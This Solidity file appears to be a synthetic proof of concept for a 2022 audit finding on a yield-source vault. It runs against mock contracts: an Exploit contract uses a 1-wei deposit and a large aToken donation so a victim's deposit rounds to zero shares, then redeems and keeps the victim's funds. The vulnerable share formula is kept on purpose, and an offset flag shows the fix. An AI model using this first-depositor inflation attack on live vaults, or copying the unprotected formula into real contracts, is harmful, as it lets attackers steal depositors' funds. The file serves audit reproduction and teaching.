// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  PoolTogether AaveV3YieldSource — first depositor inflates pricePerShare
    (Code4rena 2022-04, WatchPug / unforgiven, H-01).
    SYNTHETIC, cheatcode-free. _tokenToShares keeps the audited formula.
    Deposit 1 wei (1 share), donate 10_000e18 aTokens, and the next
    9_999e18 deposit rounds to 0 shares. The attacker redeems the only
    share and keeps those 9_999e18. A virtual offset of 1_000_000 makes
    the second depositor receive shares. */

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}

using SafeMath for uint256;

contract Underlying {
    string public constant symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract AToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockPool {
    Underlying public underlying;
    AToken public aToken;

    constructor(Underlying underlying_, AToken aToken_) {
        underlying = underlying_;
        aToken = aToken_;
    }

    function supply(address, uint256 amount, address onBehalf) external {
        underlying.transferFrom(msg.sender, address(this), amount);
        aToken.mint(onBehalf, amount);
    }

    function withdraw(address, uint256 amount, address to) external {
        aToken.burn(msg.sender, amount);
        underlying.transfer(to, amount);
    }
}

contract AaveV3YieldSource {
    uint256 internal constant OFFSET = 1_000_000;

    Underlying public underlying;
    AToken public aToken;
    MockPool public pool;
    bool public immutable useOffset;

    mapping(address => uint256) public balanceOf;
    uint256 internal _totalSupply;
    uint256 public lastMinted;

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    constructor(Underlying underlying_, AToken aToken_, MockPool pool_, bool useOffset_) {
        underlying = underlying_;
        aToken = aToken_;
        pool = pool_;
        useOffset = useOffset_;
    }

    function _mint(address to, uint256 amount) internal {
        balanceOf[to] += amount;
        _totalSupply += amount;
    }

    function _burn(address from, uint256 amount) internal {
        balanceOf[from] -= amount;
        _totalSupply -= amount;
    }

    /// @notice Audited AaveV3YieldSource._tokenToShares.
    function _tokenToShares(uint256 _tokens) internal view returns (uint256) {
        uint256 _supply = totalSupply();
        // shares = (tokens * totalShares) / yieldSourceATokenTotalSupply
        if (_supply == 0) return _tokens;
        if (useOffset) {
            return _tokens.mul(_supply + OFFSET).div(aToken.balanceOf(address(this)) + OFFSET);
        }
        // @> VULN: donated aTokens inflate the denominator, so the next deposit rounds to 0 shares
        return _tokens.mul(_supply).div(aToken.balanceOf(address(this)));
    }

    function _sharesToToken(uint256 _shares) public view returns (uint256) {
        uint256 _supply = totalSupply();
        // tokens = (shares * yieldSourceATokenTotalSupply) / totalShares
        return _supply == 0 ? _shares : _shares.mul(aToken.balanceOf(address(this))).div(_supply);
    }

    function supplyTokenTo(uint256 _depositAmount, address _to) external {
        uint256 _shares = _tokenToShares(_depositAmount);
        underlying.transferFrom(msg.sender, address(this), _depositAmount);
        underlying.approve(address(pool), _depositAmount);
        pool.supply(address(underlying), _depositAmount, address(this));
        _mint(_to, _shares);
        lastMinted = _shares;
    }

    function redeemToken(uint256 _redeemAmount) external returns (uint256) {
        uint256 _shares = _tokenToShares(_redeemAmount);
        _burn(msg.sender, _shares);
        pool.withdraw(address(underlying), _redeemAmount, address(this));
        underlying.transfer(msg.sender, _redeemAmount);
        return _redeemAmount;
    }
}

contract Victim {
    function deposit(AaveV3YieldSource ys, uint256 amount) external {
        ys.underlying().approve(address(ys), amount);
        ys.supplyTokenTo(amount, address(this));
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant DONATION = 10_000 ether;
    uint256 internal constant VICTIM_DEPOSIT = 9_999 ether;

    Underlying public underlying;
    AToken public aToken;
    MockPool public pool;
    AaveV3YieldSource public ys;
    Victim public victim;
    uint256 public victimShares;
    uint256 public profit;

    function run() external {
        underlying = new Underlying(); // nonce 1
        aToken = new AToken(); // nonce 2
        pool = new MockPool(underlying, aToken); // nonce 3
        ys = new AaveV3YieldSource(underlying, aToken, pool, false); // nonce 4
        victim = new Victim(); // nonce 5

        underlying.mint(address(this), 1 + DONATION);
        underlying.mint(address(victim), VICTIM_DEPOSIT);

        underlying.approve(address(ys), 1);
        ys.supplyTokenTo(1, address(this));

        underlying.approve(address(pool), DONATION);
        pool.supply(address(underlying), DONATION, address(this));
        aToken.transfer(address(ys), DONATION);

        victim.deposit(ys, VICTIM_DEPOSIT);
        victimShares = ys.balanceOf(address(victim));
        require(victimShares == 0, "victim shares");

        uint256 assets = ys._sharesToToken(ys.balanceOf(address(this)));
        ys.redeemToken(assets);
        underlying.transfer(ATTACKER, VICTIM_DEPOSIT);
        profit = underlying.balanceOf(ATTACKER);
        require(profit == VICTIM_DEPOSIT, "profit");
    }
}
